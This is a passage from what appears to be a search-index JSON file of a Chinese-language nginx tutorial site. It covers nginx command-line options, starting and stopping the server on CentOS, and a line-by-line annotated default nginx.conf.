\u663e\u793a\u7248\u672c\u548c\u7f16\u8bd1\u914d\u7f6e\u9009\u9879\uff0c\u7136\u540e\u9000\u51fa -t : \u6d4b\u8bd5\u914d\u7f6e\u548c\u9000\u51fa -T : \u6d4b\u8bd5\u914d\u7f6e\uff0c\u8f6c\u50a8\u5e76\u9000\u51fa -q : \u5728\u914d\u7f6e\u6d4b\u8bd5\u671f\u95f4\u6291\u5236\u975e\u9519\u8bef\u6d88\u606f -s signal : \u5411\u4e3b\u8fdb\u7a0b\u53d1\u9001\u4fe1\u53f7\uff1a\u505c\u6b62\u3001\u9000\u51fa\u3001\u91cd\u65b0\u6253\u5f00\u3001\u91cd\u65b0\u52a0\u8f7d\u3002 stop, quit, reopen, reload -p prefix : \u8bbe\u7f6e\u524d\u7f00\u8def\u5f84 (default: /usr/local/webserver/nginx/) -e filename : \u8bbe\u7f6e\u9519\u8bef\u65e5\u5fd7\u6587\u4ef6 (default: logs/error.log) -c filename : \u8bbe\u7f6e\u914d\u7f6e\u6587\u4ef6 (default: conf/nginx.conf) -g directives : \u8bbe\u7f6e\u914d\u7f6e\u6587\u4ef6\u4e4b\u5916\u7684\u5168\u5c40\u53c2\u6570 --\u53ef\u4ee5\u8bbe\u7f6e\u7684\u53c2\u6570\uff1a Core functionality (p2hp.com) \u542f\u52a8 [root@VM-0-16-centos ~]# cd /usr/local/webserver/nginx/sbin [root@VM-0-16-centos sbin]# ./nginx \u6ca1\u6709\u63d0\u793a\u5c31\u662f\u542f\u52a8\u6210\u529f\u4e86 [root@VM-0-16-centos sbin]# ps -ef | grep nginx root 396270 1 0 00:32 ? 00:00:00 nginx: master process ./nginx nobody 396271 396270 0 00:32 ? 00:00:00 nginx: worker process root 396311 376295 0 00:32 pts/1 00:00:00 grep --color=auto nginx [root@VM-0-16-centos ~]# cd /usr/local/webserver/nginx/ [root@VM-0-16-centos nginx]# tree ... \u67e5\u770b\u76ee\u5f55\uff0c\u53ea\u6709\u4e24\u4e2ahtml \u251c\u2500\u2500 html \u2502 \u251c\u2500\u2500 50x.html \u2502 \u2514\u2500\u2500 index.html \u251c\u2500\u2500 proxy_temp \u251c\u2500\u2500 sbin \u2502 \u2514\u2500\u2500 nginx [root@VM-0-16-centos nginx]# curl localhost/50x.html [root@VM-0-16-centos nginx]# curl localhost/index.html \u505c\u6b62nginx [root@VM-0-16-centos ~]# cd /usr/local/webserver/nginx/sbin [root@VM-0-16-centos sbin]# ./nginx -s quit [root@VM-0-16-centos sbin]# ps -ef | grep nginx root 397682 376295 0 00:38 pts/1 00:00:00 grep --color=auto nginx","title":"Nginx\u542f\u52a8\u53ca\u547d\u4ee4\u884c\u53c2\u6570"},{"location":"middleware/nginx/nginx_cmd/#nginx","text":"Command-line parameters (p2hp.com) [root@VM-0-16-centos sbin]# ./nginx -h nginx version: nginx/1.24.0 Usage: nginx [-?hvVtTq] [-s signal] [-p prefix] [-e filename] [-c filename] [-g directives]","title":"nginx\u547d\u4ee4\u53c2\u6570"},{"location":"middleware/nginx/nginx_cmd/#_1","text":"-?,-h : \u6b64\u5e2e\u52a9 -v : \u663e\u793a\u7248\u672c\u5e76\u9000\u51fa -V : \u663e\u793a\u7248\u672c\u548c\u7f16\u8bd1\u914d\u7f6e\u9009\u9879\uff0c\u7136\u540e\u9000\u51fa -t : \u6d4b\u8bd5\u914d\u7f6e\u548c\u9000\u51fa -T : \u6d4b\u8bd5\u914d\u7f6e\uff0c\u8f6c\u50a8\u5e76\u9000\u51fa -q : \u5728\u914d\u7f6e\u6d4b\u8bd5\u671f\u95f4\u6291\u5236\u975e\u9519\u8bef\u6d88\u606f -s signal : \u5411\u4e3b\u8fdb\u7a0b\u53d1\u9001\u4fe1\u53f7\uff1a\u505c\u6b62\u3001\u9000\u51fa\u3001\u91cd\u65b0\u6253\u5f00\u3001\u91cd\u65b0\u52a0\u8f7d\u3002 stop, quit, reopen, reload -p prefix : \u8bbe\u7f6e\u524d\u7f00\u8def\u5f84 (default: /usr/local/webserver/nginx/) -e filename : \u8bbe\u7f6e\u9519\u8bef\u65e5\u5fd7\u6587\u4ef6 (default: logs/error.log) -c filename : \u8bbe\u7f6e\u914d\u7f6e\u6587\u4ef6 (default: conf/nginx.conf) -g directives : \u8bbe\u7f6e\u914d\u7f6e\u6587\u4ef6\u4e4b\u5916\u7684\u5168\u5c40\u53c2\u6570 --\u53ef\u4ee5\u8bbe\u7f6e\u7684\u53c2\u6570\uff1a Core functionality (p2hp.com)","title":"\u9009\u9879:"},{"location":"middleware/nginx/nginx_cmd/#_2","text":"[root@VM-0-16-centos ~]# cd /usr/local/webserver/nginx/sbin [root@VM-0-16-centos sbin]# ./nginx \u6ca1\u6709\u63d0\u793a\u5c31\u662f\u542f\u52a8\u6210\u529f\u4e86 [root@VM-0-16-centos sbin]# ps -ef | grep nginx root 396270 1 0 00:32 ? 00:00:00 nginx: master process ./nginx nobody 396271 396270 0 00:32 ? 00:00:00 nginx: worker process root 396311 376295 0 00:32 pts/1 00:00:00 grep --color=auto nginx [root@VM-0-16-centos ~]# cd /usr/local/webserver/nginx/ [root@VM-0-16-centos nginx]# tree ... \u67e5\u770b\u76ee\u5f55\uff0c\u53ea\u6709\u4e24\u4e2ahtml \u251c\u2500\u2500 html \u2502 \u251c\u2500\u2500 50x.html \u2502 \u2514\u2500\u2500 index.html \u251c\u2500\u2500 proxy_temp \u251c\u2500\u2500 sbin \u2502 \u2514\u2500\u2500 nginx [root@VM-0-16-centos nginx]# curl localhost/50x.html [root@VM-0-16-centos nginx]# curl localhost/index.html \u505c\u6b62nginx [root@VM-0-16-centos ~]# cd /usr/local/webserver/nginx/sbin [root@VM-0-16-centos sbin]# ./nginx -s quit [root@VM-0-16-centos sbin]# ps -ef | grep nginx root 397682 376295 0 00:38 pts/1 00:00:00 grep --color=auto nginx","title":"\u542f\u52a8"},{"location":"middleware/nginx/nginx_conf/","text":"Nginx\u914d\u7f6e\u6587\u4ef6\u8be6\u89e3 \u4e00\u4e9b\u6709\u5e2e\u52a9\u7684\u6587\u6863\uff1a Nginx \u914d\u7f6e\u8be6\u89e3 | \u83dc\u9e1f\u6559\u7a0b (runoob.com) \u6e90\u7801\u5b89\u88c5\u540e\u7684\u9ed8\u8ba4\u914d\u7f6e \u914d\u7f6e\u6587\u4ef6\u4e2d\u5173\u952e\u5b57\u90fd\u53ef\u4ee5\u5728\u5b98\u7f51\u6587\u6863 Alphabetical index of directives (p2hp.com) \u4e2d\u8fdb\u884c\u641c\u7d22\u3002\u5e76\u7ed9\u51fa\u5173\u952e\u5b57\u7684\u8bbe\u7f6e\u8303\u56f4\u3002 \u5168\u5c40\u5757 \uff1a\u914d\u7f6e\u5f71\u54cdnginx\u5168\u5c40\u7684\u6307\u4ee4\u3002\u4e00\u822c\u6709\u8fd0\u884cnginx\u670d\u52a1\u5668\u7684\u7528\u6237\u7ec4\uff0cnginx\u8fdb\u7a0bpid\u5b58\u653e\u8def\u5f84\uff0c\u65e5\u5fd7\u5b58\u653e\u8def\u5f84\uff0c\u914d\u7f6e\u6587\u4ef6\u5f15\u5165\uff0c\u5141\u8bb8\u751f\u6210worker process\u6570\u7b49\u3002 events\u5757 \uff1a\u914d\u7f6e\u5f71\u54cdnginx\u670d\u52a1\u5668\u6216\u4e0e\u7528\u6237\u7684\u7f51\u7edc\u8fde\u63a5\u3002\u6709\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u6700\u5927\u8fde\u63a5\u6570\uff0c\u9009\u53d6\u54ea\u79cd\u4e8b\u4ef6\u9a71\u52a8\u6a21\u578b\u5904\u7406\u8fde\u63a5\u8bf7\u6c42\uff0c\u662f\u5426\u5141\u8bb8\u540c\u65f6\u63a5\u53d7\u591a\u4e2a\u7f51\u8def\u8fde\u63a5\uff0c\u5f00\u542f\u591a\u4e2a\u7f51\u7edc\u8fde\u63a5\u5e8f\u5217\u5316\u7b49\u3002 http\u5757 \uff1a\u53ef\u4ee5\u5d4c\u5957\u591a\u4e2aserver\uff0c\u914d\u7f6e\u4ee3\u7406\uff0c\u7f13\u5b58\uff0c\u65e5\u5fd7\u5b9a\u4e49\u7b49\u7edd\u5927\u591a\u6570\u529f\u80fd\u548c\u7b2c\u4e09\u65b9\u6a21\u5757\u7684\u914d\u7f6e\u3002\u5982\u6587\u4ef6\u5f15\u5165\uff0cmime-type\u5b9a\u4e49\uff0c\u65e5\u5fd7\u81ea\u5b9a\u4e49\uff0c\u662f\u5426\u4f7f\u7528sendfile\u4f20\u8f93\u6587\u4ef6\uff0c\u8fde\u63a5\u8d85\u65f6\u65f6\u95f4\uff0c\u5355\u8fde\u63a5\u8bf7\u6c42\u6570\u7b49\u3002 server\u5757 \uff1a\u914d\u7f6e\u865a\u62df\u4e3b\u673a\u7684\u76f8\u5173\u53c2\u6570\uff0c\u4e00\u4e2ahttp\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2aserver\u3002 location\u5757 \uff1a\u914d\u7f6e\u8bf7\u6c42\u7684\u8def\u7531\uff0c\u4ee5\u53ca\u5404\u79cd\u9875\u9762\u7684\u5904\u7406\u60c5\u51b5 [root@VM-0-16-centos conf]# cd /usr/local/webserver/nginx/conf/ [root@VM-0-16-centos conf]# cat nginx.conf | grep -v \"^[[:blank:]]*#\" | grep -v '^#' | grep -v '^$' #\u53bb\u6389\u6ce8\u91ca worker_processes 1; #nginx\u6709\u4e00\u4e2a\u4e3b\u8fdb\u7a0b\u548c\u51e0\u4e2a\u5de5\u4f5c\u8fdb\u7a0b\u3002\u4e3b\u8fdb\u7a0b\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8bfb\u53d6\u548c\u8bc4\u4f30\u914d\u7f6e\uff0c #\u5e76\u7ef4\u62a4\u5de5\u4f5c\u8fdb\u7a0b\u3002\u5de5\u4f5c\u8fdb\u7a0b\u5bf9\u8bf7\u6c42\u8fdb\u884c\u5b9e\u9645\u5904\u7406\u3002nginx\u91c7\u7528\u57fa\u4e8e\u4e8b\u4ef6\u7684\u6a21\u578b #\u548c\u4f9d\u8d56\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7684\u673a\u5236\u6765\u6709\u6548\u5730\u5728\u5de5\u4f5c\u8fdb\u7a0b\u4e4b\u95f4\u5206\u53d1\u8bf7\u6c42\u3002\u5de5\u4f5c\u8fdb\u7a0b\u7684\u6570\u91cf #\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b9a\u4e49\uff0c\u5e76\u4e14\u53ef\u4ee5\u9488\u5bf9 \u7ed9\u5b9a\u914d\u7f6e \u6216 \u81ea\u52a8\u8c03\u6574 \u3002 \u6b64\u5904\u503c\u53ef\u4ee5\u8bbe #\u7f6e\u6210\u6570\u5b57\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u6210auto \u8be6\u60c5\u89e3\u91ca\uff1ahttps://nginx.p2hp.com/en/docs/ngx_core_module.html#worker_processes events { worker_connections 1024; #\u5355\u4e2a\u540e\u53f0worker process\u8fdb\u7a0b\u7684\u6700\u5927\u5e76\u53d1\u94fe\u63a5\u6570 } http { include mime.types; # mime.types \u8bbe\u5b9amime\u7c7b\u578b(\u90ae\u4ef6\u652f\u6301\u7c7b\u578b),\u7c7b\u578b\u7531mime.types\u6587\u4ef6\u5b9a\u4e49 # include \u5728\u914d\u7f6e\u4e2d\u5305\u542b\u53e6\u4e00\u4e2a\u6216\u4e0e\u6307\u5b9a\u6587\u4ef6\u5339\u914d\u7684\u6587\u4ef6\u3002\u5305\u542b\u7684\u6587\u4ef6\u5e94\u7531\u8bed\u6cd5\u6b63\u786e\u7684\u6307\u4ee4\u548c\u5757\u7ec4\u6210\u3002 default_type application/octet-stream; #default_type \u5b9a\u4e49\u54cd\u5e94\u7684\u9ed8\u8ba4MIME\u7c7b\u578b\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u578b\u6307\u4ee4\u8bbe\u7f6e\u6587\u4ef6\u6269\u5c55\u540d\u6620\u5c04\u5230MIME\u7c7b\u578b\u3002 sendfile on; # sendfile \u542f\u7528\u6216\u7981\u7528 sendfile()\u7684\u4f7f\u7528.\u4ece nginx 0.8.12 \u548c FreeBSD 5.2.1 \u5f00\u59cb\uff0c\u53ef\u4ee5\u4f7f\u7528 aio \u6765\u9884\u52a0\u8f7d\u6570\u636e \u4e3a\uff1asendfile() # https://nginx.p2hp.com/en/docs/http/ngx_http_core_module.html#sendfile keepalive_timeout 65; # keepalive_timeout \u8bbe\u7f6e\u4e00\u4e2a\u8d85\u65f6\uff0c\u5728\u6b64\u671f\u95f4\uff0c\u670d\u52a1\u5668\u7aef\u7684\u4fdd\u6301\u6d3b\u52a8\u5ba2\u6237\u7aef\u8fde\u63a5\u5c06\u4fdd\u6301\u6253\u5f00\u72b6\u6001 server { listen 80; # listen \u8bbe\u7f6eIP\u7684\u5730\u5740\u548c\u7aef\u53e3\uff0c\u6216\u670d\u52a1\u5668\u63a5\u53d7\u8bf7\u6c42\u7684UNIX\u57df\u5957\u63a5\u5b57\u7684\u8def\u5f84\u3002\u53ef\u4ee5\u6307\u5b9a\u5730\u5740\u548c\u7aef\u53e3\uff0c\u6216\u8005\u53ea\u80fd\u6307\u5b9a\u5730\u5740\u6216\u7aef\u53e3\u3002\u5730\u5740\u4e5f\u53ef\u4ee5\u662f\u4e3b\u673a\u540d server_name localhost; # server_name \u8bbe\u7f6e\u865a\u62df\u670d\u52a1\u5668\u7684\u540d\u79f0 location / { # location \u6839\u636e\u8bf7\u6c42 URI \u8bbe\u7f6e\u914d\u7f6e\u3002 root html; # root \u8bbe\u7f6e\u8bf7\u6c42\u7684\u6839\u76ee\u5f55 index index.html index.htm; # \u5b9a\u4e49\u5c06\u7528\u4f5c\u7d22\u5f15\u7684\u6587\u4ef6\u3002 \u540d\u79f0\u53ef\u4ee5\u5305\u542b\u53d8\u91cf\u3002 \u6309\u6307\u5b9a\u987a\u5e8f\u68c0\u67e5\u6587\u4ef6\u3002 \u5217\u8868\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u53ef\u4ee5\u662f\u5177\u6709\u7edd\u5bf9\u8def\u5f84\u7684\u6587\u4ef6\u3002 } error_page 500 502 503 504 /50x.html; # \u5b9a\u4e49\u5c06\u4e3a\u6307\u5b9a\u9519\u8bef\u663e\u793a\u7684 URI\u3002 \u503c\u53ef\u4ee5\u5305\u542b\u53d8\u91cf\u3002 location = /50x.html { root html; } } } \u5b8c\u6574\u7684\u9ed8\u8ba4nginx\u914d\u7f6e #user nobody; #user \u5b9a\u4e49\u5de5\u4f5c\u8fdb\u7a0b\u4f7f\u7528\u7684\u7528\u6237 \u4e0d\u586b\u5199\u9ed8\u8ba4\u4e3anobody worker_processes 1; #nginx\u6709\u4e00\u4e2a\u4e3b\u8fdb\u7a0b\u548c\u51e0\u4e2a\u5de5\u4f5c\u8fdb\u7a0b\u3002\u4e3b\u8fdb\u7a0b\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8bfb\u53d6\u548c\u8bc4\u4f30\u914d\u7f6e\uff0c #\u5e76\u7ef4\u62a4\u5de5\u4f5c\u8fdb\u7a0b\u3002\u5de5\u4f5c\u8fdb\u7a0b\u5bf9\u8bf7\u6c42\u8fdb\u884c\u5b9e\u9645\u5904\u7406\u3002nginx\u91c7\u7528\u57fa\u4e8e\u4e8b\u4ef6\u7684\u6a21\u578b #\u548c\u4f9d\u8d56\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7684\u673a\u5236\u6765\u6709\u6548\u5730\u5728\u5de5\u4f5c\u8fdb\u7a0b\u4e4b\u95f4\u5206\u53d1\u8bf7\u6c42\u3002\u5de5\u4f5c\u8fdb\u7a0b\u7684\u6570\u91cf #\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u5b9a\u4e49\uff0c\u5e76\u4e14\u53ef\u4ee5\u9488\u5bf9 \u7ed9\u5b9a\u914d\u7f6e \u6216 \u81ea\u52a8\u8c03\u6574 \u3002 \u6b64\u5904\u503c\u53ef\u4ee5\u8bbe #\u7f6e\u6210\u6570\u5b57\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u6210auto \u8be6\u60c5\u89e3\u91ca\uff1ahttps://nginx.p2hp.com/en/docs/ngx_core_module.html#worker_processes #error_log logs/error.log; #error_log logs/error.log notice; #error_log logs/error.log info; # \u5b9a\u4e49\u9519\u8bef\u65e5\u5fd7\u548c\u7ea7\u522b #pid logs/nginx.pid; # \u5b9a\u4e49\u4e00\u4e2a\u6587\u4ef6\uff0c\u8be5\u6587\u4ef6\u5c06\u5b58\u50a8\u4e3b\u8fdb\u7a0b\u7684\u8fdb\u7a0bID\u3002 \u9ed8\u8ba4\u5728 logs/nginx.pid events { worker_connections 1024; # \u5355\u4e2a\u540e\u53f0worker process\u8fdb\u7a0b\u7684\u6700\u5927\u5e76\u53d1\u94fe\u63a5\u6570 } http { include mime.types; # mime.types \u8bbe\u5b9amime\u7c7b\u578b(\u90ae\u4ef6\u652f\u6301\u7c7b\u578b),\u7c7b\u578b\u7531mime.types\u6587\u4ef6\u5b9a\u4e49 # include \u5728\u914d\u7f6e\u4e2d\u5305\u542b\u53e6\u4e00\u4e2a\u6216\u4e0e\u6307\u5b9a\u6587\u4ef6\u5339\u914d\u7684\u6587\u4ef6\u3002\u5305\u542b\u7684\u6587\u4ef6\u5e94\u7531\u8bed\u6cd5\u6b63\u786e\u7684\u6307\u4ee4\u548c\u5757\u7ec4\u6210\u3002 default_type application/octet-stream; # default_type \u5b9a\u4e49\u54cd\u5e94\u7684\u9ed8\u8ba4MIME\u7c7b\u578b\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u578b\u6307\u4ee4\u8bbe\u7f6e\u6587\u4ef6\u6269\u5c55\u540d\u6620\u5c04\u5230MIME\u7c7b\u578b\u3002 #log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; # \u6307\u5b9a\u65e5\u5fd7\u683c\u5f0f\u3002 \u683c\u5f0f\u7684\u540d\u5b57 \u5b9a\u4e49\u8981\u8bb0\u5f55\u54ea\u4e9b\u4e1c\u897f # \u9700\u8981\u8bb0\u5f55\u54ea\u4e9b\u5b57\u6bb5\uff0c\u53ef\u4ee5\u4ece\u6b64\u7f51\u9875\u4e0a\u67e5\u770b # https://nginx.p2hp.com/en/docs/http/ngx_http_core_module.html#variables_hash_max_size # \u4f8b\u5982\u5982\u4e0b # $bytes_sent # \u53d1\u9001\u5230\u5ba2\u6237\u7aef\u7684\u5b57\u8282\u6570 # $connection # \u8fde\u63a5\u5e8f\u5217\u53f7 # $connection_requests # \u901a\u8fc7\u8fde\u63a5\u53d1\u51fa\u7684\u5f53\u524d\u8bf7\u6c42\u6570 \uff081.1.18\uff09 # $msec # \u4ee5\u79d2\u4e3a\u5355\u4f4d\u7684\u65f6\u95f4\uff0c\u65e5\u5fd7\u5199\u5165\u65f6\u5206\u8fa8\u7387\u4e3a\u6beb\u79d2 # $pipe # \u201c\u201d if request was pipelined, \u201c\u201d otherwise p. # $request_length # \u8bf7\u6c42\u957f\u5ea6\uff08\u5305\u62ec\u8bf7\u6c42\u884c\u3001\u6807\u5934\u548c\u8bf7\u6c42\u6b63\u6587\uff09 # $request_time # \u8bf7\u6c42\u5904\u7406\u65f6\u95f4\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\uff0c\u5206\u8fa8\u7387\u4e3a\u6beb\u79d2; # $status # \u54cd\u5e94\u72b6\u6001 # $time_iso8601 # ISO 8601 \u6807\u51c6\u683c\u5f0f\u7684\u5f53\u5730\u65f6\u95f4 # $time_local # \u901a\u7528\u65e5\u5fd7\u683c\u5f0f\u7684\u672c\u5730\u65f6\u95f4 #access_log logs/access.log main; # \u5b9a\u4e49\u8bbf\u95ee\u65e5\u5fd7 \u8def\u5f84 \u53ca\u683c\u5f0f sendfile on; # sendfile \u542f\u7528\u6216\u7981\u7528 sendfile()\u7684\u4f7f\u7528.\u4ece nginx 0.8.12 \u548c FreeBSD 5.2.1 \u5f00\u59cb\uff0c\u53ef\u4ee5\u4f7f\u7528 aio \u6765\u9884\u52a0\u8f7d\u6570\u636e \u4e3a\uff1asendfile() #tcp_nopush on; # \u542f\u7528\u6216\u7981\u7528FreeBSD\u4e0a\u7684\u5957\u63a5\u5b57\u9009\u9879\u6216Linux\u4e0a\u7684\u5957\u63a5\u5b57\u9009\u9879\u3002\u4ec5\u5f53\u4f7f\u7528sendfile\u65f6\uff0c\u624d\u4f1a\u542f\u7528\u8fd9\u4e9b\u9009\u9879\u3002\u542f\u7528\u8be5\u9009\u9879\u5141\u8bb8TCP_NOPUSHTCP_CORK #keepalive_timeout 0; keepalive_timeout 65; # keepalive_timeout \u8bbe\u7f6e\u4e00\u4e2a\u8d85\u65f6\uff0c\u5728\u6b64\u671f\u95f4\uff0c\u670d\u52a1\u5668\u7aef\u7684\u4fdd\u6301\u6d3b\u52a8\u5ba2\u6237\u7aef\u8fde\u63a5\u5c06\u4fdd\u6301\u6253\u5f00\u72b6\u6001 #gzip on; #\u542f\u7528\u6216\u7981\u7528\u54cd\u5e94\u7684 gziping\u3002 server { listen 80; # listen \u8bbe\u7f6eIP\u7684\u5730\u5740\u548c\u7aef\u53e3\uff0c\u6216\u670d\u52a1\u5668\u63a5\u53d7\u8bf7\u6c42\u7684UNIX\u57df\u5957\u63a5\u5b57\u7684\u8def\u5f84\u3002\u53ef\u4ee5\u6307\u5b9a\u5730\u5740\u548c\u7aef\u53e3\uff0c\u6216\u8005\u53ea\u80fd\u6307\u5b9a\u5730\u5740\u6216\u7aef\u53e3\u3002\u5730\u5740\u4e5f\u53ef\u4ee5\u662f\u4e3b\u673a\u540d server_name localhost; # server_name \u8bbe\u7f6e\u865a\u62df\u670d\u52a1\u5668\u7684\u540d\u79f0 #charset koi8-r; # \u5c06\u6307\u5b9a\u7684\u5b57\u7b26\u96c6\u6dfb\u52a0\u5230\u201c\u5185\u5bb9\u7c7b\u578b\u201d \u54cd\u5e94\u6807\u5934\u5b57\u6bb5\u3002 #access_log logs/host.access.log main; # \u8fd9\u4e2aserver\u7684\u8bbf\u95ee\u65e5\u5fd7 location / { # location \u6839\u636e\u8bf7\u6c42 URI \u8bbe\u7f6e\u914d\u7f6e\u3002 root html; # root \u8bbe\u7f6e\u8bf7\u6c42\u7684\u6839\u76ee\u5f55 index index.html index.htm; # \u5b9a\u4e49\u5c06\u7528\u4f5c\u7d22\u5f15\u7684\u6587\u4ef6\u3002 \u540d\u79f0\u53ef\u4ee5\u5305\u542b\u53d8\u91cf\u3002 \u6309\u6307\u5b9a\u987a\u5e8f\u68c0\u67e5\u6587\u4ef6\u3002 \u5217\u8868\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u53ef\u4ee5\u662f\u5177\u6709\u7edd\u5bf9\u8def\u5f84\u7684\u6587\u4ef6\u3002 } #error_page 404 /404.html; # \u5b9a\u4e49\u5c06\u4e3a\u6307\u5b9a\u9519\u8bef\u663e\u793a\u7684 URI\u3002 \u503c\u53ef\u4ee5\u5305\u542b\u53d8\u91cf\u3002 # redirect server error pages to the static page /50x.html # \u5c06\u670d\u52a1\u5668\u9519\u8bef\u9875\u9762\u91cd\u5b9a\u5411\u5230\u9759\u6001\u9875\u9762/50x.html error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # \u5728127.0.0.1:80\u4e0a\u5c06PHP\u811a\u672c\u4ee3\u7406\u5230Apache\u76d1\u542c #location ~ \\.php$ { # proxy_pass http://127.0.0.1; # \u8bbe\u7f6e\u4ee3\u7406\u670d\u52a1\u5668\u7684\u534f\u8bae\u548c\u5730\u5740\uff0c\u4ee5\u53ca\u5e94\u6620\u5c04\u4f4d\u7f6e\u7684\u53ef\u9009URI\u3002\u4f5c\u4e3a\u534f\u8bae\uff0c\u53ef\u4ee5\u6307\u5b9a\u201c\u201d\u6216\u201c\u201d\u3002 # \u5730\u5740\u53ef\u4ee5\u6307\u5b9a\u4e3a\u57df\u540d\u6216IP\u5730\u5740\uff0c\u4ee5\u53ca\u53ef\u9009\u7aef\u53e3\u3002 \u53ef\u4ee5\u8bbe\u7f6e\u4e00\u7ec4\u670d\u52a1\u5668\uff0c\u7528\u670d\u52a1\u5668\u7ec4\u8fdb\u884c\u8bbe\u7f6e # https://nginx.p2hp.com/en/docs/http/ngx_http_proxy_module.html#proxy_pass #} # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # \u5c06PHP\u811a\u672c\u4f20\u9012\u5230FastCGI\u670d\u52a1\u5668\uff0c\u5728127.0.0.1:9000\u4e0a\u76d1\u542c #location ~ \\.php$ { # root html; # fastcgi_pass 127.0.0.1:9000; # \u8bbe\u7f6e FastCGI \u670d\u52a1\u5668\u7684\u5730\u5740\u3002 \u5730\u5740\u53ef\u4ee5\u6307\u5b9a\u4e3a\u57df\u540d\u6216 IP \u5730\u5740\uff0c \u548c\u4e00\u4e2a\u7aef\u53e3\uff1a # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #} # deny access to .htaccess files, if Apache's document root concurs with nginx's one # \u5982\u679cApache\u7684\u6587\u6863\u6839\u4e0enginx\u7684\u6587\u6863\u6839\u4e00\u81f4\uff0c\u5219\u62d2\u7edd\u8bbf\u95ee.htaccess\u6587\u4ef6 #location ~ /\\.ht { # deny all; #} } # another virtual host using mix of IP-, name-, and port-based configuration # \u53e6\u4e00\u4e2a\u4f7f\u7528\u57fa\u4e8eIP\u3001\u540d\u79f0\u548c\u7aef\u53e3\u7684\u914d\u7f6e\u7ec4\u5408\u7684\u865a\u62df\u4e3b\u673a #server { # listen 8000; # listen somename:8080; # server_name somename alias another.alias; # location / { # root html; # index index.html index.htm; # } #} # HTTPS server # #server { # listen 443 ssl; # server_name localhost; # ssl_certificate cert.pem; # \u4e3a\u7ed9\u5b9a\u7684\u865a\u62df\u670d\u52a1\u5668\u6307\u5b9a\u5177\u6709PEM\u683c\u5f0f\u8bc1\u4e66\u3002\u5982\u679c\u9664\u4e86\u4e3b\u8bc1\u4e66\u4e4b\u5916\u8fd8\u5e94\u6307\u5b9a\u4e2d\u95f4\u8bc1\u4e66\uff0c\u5219\u5e94\u5728\u540c\u4e00\u6587\u4ef6\u4e2d\u6309\u4ee5\u4e0b\u987a\u5e8f\u6307\u5b9a\u5b83\u4eec\uff1a\u5148\u6307\u5b9a\u4e3b\u8bc1\u4e66\uff0c\u7136\u540e\u6307\u5b9a\u4e2d\u95f4\u8bc1\u4e66\u3002PEM\u683c\u5f0f\u7684\u5bc6\u94a5\u53ef\u4ee5\u88ab\u653e\u7f6e\u5728\u76f8\u540c\u7684\u6587\u4ef6\u4e2d\u3002 # ssl_certificate_key cert.key; # key\u683c\u5f0f\u7684\u8bc1\u4e66 # ssl_session_cache shared:SSL:1m; # \u8bbe\u7f6e\u5b58\u50a8\u4f1a\u8bdd\u53c2\u6570\u7684\u7f13\u5b58\u7684\u7c7b\u578b\u548c\u5927\u5c0f\u3002 # ssl_session_timeout 5m; # \u6307\u5b9a\u5ba2\u6237\u7aef\u53ef\u4ee5\u91cd\u7528\u4f1a\u8bdd\u53c2\u6570\u7684\u65f6\u95f4\u3002 # ssl_ciphers HIGH:!aNULL:!MD5; # \u6307\u5b9a\u542f\u7528\u7684\u5bc6\u7801\u3002 \u5bc6\u7801\u4ee5 OpenSSL\u5e93 # ssl_prefer_server_ciphers on; # \u6307\u5b9a\u670d\u52a1\u5668\u5bc6\u7801\u5e94\u4f18\u5148\u4e8e\u5ba2\u6237\u7aef \u4f7f\u7528 SSLv3 \u548c TLS \u534f\u8bae\u65f6\u7684\u5bc6\u7801 # # location / { # root html; # index index.html index.htm; # } #} } \u6700","title":"Nginx\u914d\u7f6e\u8be6\u89e3"},{"location":"middleware/nginx/nginx_conf/#nginx","text":"\u4e00\u4e9b\u6709\u5e2e\u52a9\u7684\u6587\u6863\uff1a Nginx \u914d\u7f6e\u8be6\u89e3 | \u83dc\u9e1f\u6559\u7a0b (runoob.com) \u6e90\u7801\u5b89\u88c5\u540e\u7684\u9ed8\u8ba4\u914d\u7f6e \u914d\u7f6e\u6587\u4ef6\u4e2d\u5173\u952e\u5b57\u90fd\u53ef\u4ee5\u5728\u5b98\u7f51\u6587\u6863 Alphabetical index of directives (p2hp.com) \u4e2d\u8fdb\u884c\u641c\u7d22\u3002\u5e76\u7ed9\u51fa\u5173\u952e\u5b57\u7684\u8bbe\u7f6e\u8303\u56f4\u3002 \u5168\u5c40\u5757 \uff1a\u914d\u7f6e\u5f71\u54cdnginx\u5168\u5c40\u7684\u6307\u4ee4\u3002\u4e00\u822c\u6709\u8fd0\u884cnginx\u670d\u52a1\u5668\u7684\u7528\u6237\u7ec4\uff0cnginx\u8fdb\u7a0bpid\u5b58\u653e\u8def\u5f84\uff0c\u65e5\u5fd7\u5b58\u653e\u8def\u5f84\uff0c\u914d\u7f6e\u6587\u4ef6\u5f15\u5165\uff0c\u5141\u8bb8\u751f\u6210worker process\u6570\u7b49\u3002 events\u5757 